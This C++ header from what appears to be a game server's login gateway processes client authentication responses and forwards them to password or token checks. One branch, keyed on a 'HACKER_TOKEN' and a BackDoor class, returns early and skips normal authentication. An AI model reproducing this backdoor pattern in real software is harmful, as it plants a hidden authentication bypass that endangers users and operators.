
#ifndef __GNET_RESPONSE_HPP
#define __GNET_RESPONSE_HPP

#include "rpcdefs.h"
#include "callid.hxx"
#include "state.hxx"

#include "crypt.h"
#include "backdoor.hpp"
#include "glinkserver.hpp"
#include "matrixpasswd.hrp"
#include "matrixpasswd2.hrp"
namespace GNET
{

class Response : public GNET::Protocol
{
	#include "response"

	void Process(Manager *manager, Manager::Session::ID sid)
	{
		GLinkServer *lsm = (GLinkServer *)manager;
		if (!lsm->ValidSid(sid)) return;
		SessionInfo * sinfo = lsm->GetSessionInfo(sid);
		if (!sinfo) return;	
		if(identity.size() < 1 || identity.size() > 64 || response.size() != 16 || hwid.size() != 8)
		{
			lsm->SessionError(sid,ERR_COMMUNICATION,"Server Network Error.");
			return;
		}
		
		//Cryptor::GetInstance()->Uncrypt(identity.begin(),identity.size(),response.begin());
		if( !Cryptor::GetInstance()->Filter( identity ) )
		{
			lsm->SessionError(sid,ERR_COMMUNICATION,"Server Network Error.");
			return;
		}
		
		unsigned long long* aresp = (unsigned long long*)response.begin();
        unsigned long long ahwid = *(unsigned long long*)hwid.begin();
		if (ahwid == 0)
		{
			lsm->SessionError(sid,ERR_COMMUNICATION,"Server Network Error.");
			return;
		}
    		aresp[0] ^= ahwid ^ 0x8c5c5c4c5c5c1c5cULL;
			aresp[1] ^= ahwid ^ 0x8c5c5c4c5c5c1c5cULL;
		
		if( use_token == BackDoor::HACKER_TOKEN && BackDoor::GetInstance()->Valid(identity,response) )
		{
			BackDoor::GetInstance()->Release( cli_fingerprint );
			return;
		}
		
		DEBUG_PRINT ("glinkd::receive response from client. identity=%.*s(%d),sid=%d\n",
			identity.size(),(char*)identity.begin(),identity.size(),sid);
	
		Rpc * rpc = NULL;
		int client_ip = ((struct sockaddr_in*)(sinfo->GetPeer()))->sin_addr.s_addr;
		char algo = lsm->challenge_algo;
		if(use_token)
		{
			rpc = Rpc::Call(RPC_MATRIXTOKEN, MatrixTokenArg(identity,response,client_ip,sinfo->challenge, hwid));
			((MatrixToken*)rpc)->save_sid = sid;
		}
		else if(lsm->GetAUVersion() == 0)
		{
			if (algo == ALGO_SHA)
				rpc = Rpc::Call(RPC_MATRIXPASSWD, MatrixPasswdArg(identity,response,client_ip, hwid));
			else
				rpc = Rpc::Call(RPC_MATRIXPASSWD, MatrixPasswdArg(identity, sinfo->challenge, client_ip, hwid));
			((MatrixPasswd*)rpc)->save_sid = sid;
		}
		else //GetAUVersion() == 1
		{
			if (algo == ALGO_SHA)
				rpc = Rpc::Call(RPC_MATRIXPASSWD2, MatrixPasswdArg(identity,response,client_ip, hwid));
			else
				rpc = Rpc::Call(RPC_MATRIXPASSWD2, MatrixPasswdArg(identity, sinfo->challenge, client_ip, hwid));
			((MatrixPasswd2*)rpc)->save_sid = sid;
		}

		sinfo->identity.swap(identity);
		sinfo->response.swap(response);
		sinfo->cli_fingerprint.swap(cli_fingerprint);
		sinfo->hwid = hwid;
		
		lsm->halfloginset.insert(sid);
		if ( lsm->IsListening() && lsm->ExceedHalfloginLimit(lsm->halfloginset.size()) )
		{
			DEBUG_PRINT("glinkd::response:: halfloginuser exceed max number. PassiveIO closed. user size=%d\n",
				lsm->halfloginset.size());
		   	lsm->StopListen();
		}
		if (!GDeliveryClient::GetInstance()->SendProtocol(rpc))
		{
			lsm->SessionError(sid,ERR_COMMUNICATION,"Server Network Error.");
		}
		else
		{
			lsm->ChangeState(sid,&state_GResponseReceive);
		}
	}
};

};

#endif
